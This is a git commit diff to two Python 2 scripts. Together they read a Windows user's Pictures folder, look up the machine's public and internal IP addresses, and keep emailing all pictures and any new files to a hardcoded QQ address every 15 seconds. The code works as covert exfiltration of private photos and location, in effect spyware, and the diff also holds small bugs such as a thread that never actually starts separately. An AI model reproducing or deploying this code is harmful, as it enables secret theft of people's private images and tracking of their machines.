f4d91d00f3ad1678e56210425f8bf3289bca680e
unknown <jason03.zhang@jason03-zhang.corp.vipshop.com>
2015-09-15 11:17:02 +0800

    bug fix. Read Permission from r+ to rb to read non-text file update code construct. add print info to help debug add more than one dir work feature can monitor newly file and send. featrue using thread to control send frequence

--- email_client.py
+++ email_client.py
@@ -20,12 +20,12 @@ def mail(to, subject, text, attach):
    msg.attach(MIMEText(text))
 
 
-
    for f in attach:
        if os.path.isdir(f):
-           print f+" is a dir"
+          # print f+" is a dir"
            continue
-       with open(f,'r+') as f_attach:
+    #open with 'rb' to read non-text file
+       with open(f,'rb') as f_attach:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f_attach.read())
            Encoders.encode_base64(part)
@@ -34,22 +34,9 @@ def mail(to, subject, text, attach):
            msg.attach(part)
 
 
-   # part.set_payload(open(attach, 'rb').read())
-   # Encoders.encode_base64(part)
-   # part.add_header('Content-Disposition',
-   #         'attachment; filename="%s"' % os.path.basename(attach))
-   # msg.attach(part)
-
    mailServer = smtplib.SMTP("smtp.qq.com")
 
    mailServer.login(gmail_user, gmail_pwd)
-   mailServer.sendmail(gmail_user, to, msg.as_string())
+   mailServer.sendmail(gmail_user, to, msg.as_string().encode('utf-8'))
    # Should be mailServer.quit(), but that crashes...
    mailServer.close()
-
-#attach =('test.jpeg','test2.jpeg','test3.jpg','test4.jpg','test5.jpg')
-
-# mail("liuhongyuand@gmail.com",
-#    "Hello from python!",
-#    "This is a email sent with python",
-#    attach)
--- file_change_finder.py
+++ file_change_finder.py
@@ -5,30 +5,104 @@
 import os
 import time
 import socket
+import sys
+import threading
 from urllib2 import urlopen
 
 import email_client
-pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")
 
-files = os.listdir(pic_path)
-
-def generate_abs_path(f):
-    return pic_path+"\\"+f
-
-abs_files_name = map(generate_abs_path,files)
-
+current_public_ip = urlopen('http://ip.42.pl/raw').read()
+current_inner_ip = socket.gethostbyname(socket.gethostname())
 current_time = time.strftime("%Y-%m-%d %H:%M:%S")
 
 
+target_email = "848334436@qq.com"
+subject = "From %s computer" %current_public_ip
+content = current_time +"\r %s" %current_inner_ip
 
-#print "last modified: %s" % time.ctime(os.path.getctime(abs_files_name[0]))
+current_time = time.strftime("%Y-%m-%d %H:%M:%S")
 
-print time.mktime(time.strptime(time.ctime(os.path.getctime(abs_files_name[0])),"%a %b %d %H:%M:%S %Y"))
+sys_init_time = 0
+last_send_time = 0
+execute_time = 15 #one day to execute
 
-current_public_ip = urlopen('http://ip.42.pl/raw').read()
-current_inner_ip = socket.gethostname(socket.gethostname())
 
-email_client.mail("848334436@qq.com",
-   "From %s computer" %current_public_ip,
-   current_time +"\r\n %s" %current_inner_ip,
-   abs_files_name)
+def _init(pic_path):
+    print "System initing....\r"
+
+    for path in pic_path:
+        files = os.listdir(path)
+        def generate_abs_path(f):
+            return path+"\\"+f
+
+        abs_files_name = map(generate_abs_path,files)
+
+        email_client.mail(target_email,
+           subject,
+           content,
+           abs_files_name)
+
+    sys_init_time = time.time()
+    global last_send_time
+    last_send_time = sys_init_time
+    print "System initing send time %s" %last_send_time
+    print "System inited at %s.\r" %time.strftime("%Y-%m-%d %H:%M:%S")
+
+def _single_file_monitor(f):
+    global last_send_time
+    f_create_time = time.mktime(time.strptime(time.ctime(os.path.getctime(f)),"%a %b %d %H:%M:%S %Y"))
+    if (f_create_time - last_send_time) > 0:
+        print "File %s created at %s\r"%(f,f_create_time)
+        print "Last Send Time %s" %last_send_time
+        return True
+    else:
+        return False
+
+def _running(pic_path):
+    flag = True
+    files_to_send = []
+    send_times = 1
+    while flag:
+        updated_files = []
+        for path in pic_path:
+            files = os.listdir(path)
+
+            def generate_abs_path(f):
+                return path+"\\"+f
+
+            abs_files_name = map(generate_abs_path,files)
+
+            for f_name in abs_files_name:
+                if _single_file_monitor(f_name):
+                    updated_files.append(f_name)
+                else:
+                    print "File %s will not be sent twice\r" %f_name
+
+            if updated_files == []:
+                print "Entering wait condition"
+            else:
+                email_client.mail(target_email,
+                   subject,
+                   content,
+                   updated_files)
+                send_times += 1
+            global last_send_time
+            last_send_time = time.time()
+            print "File sent at %s \r" %time.ctime()
+
+        print "System sleep %s seconds" %execute_time
+
+        print "System has sent %s mails" %send_times
+        time.sleep(execute_time)
+
+
+
+
+if __name__ == '__main__':
+    pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")
+
+    handle_path = []
+    handle_path.append(pic_path)
+    _init(handle_path)
+
+    threading.Thread(target=_running(handle_path)).start()
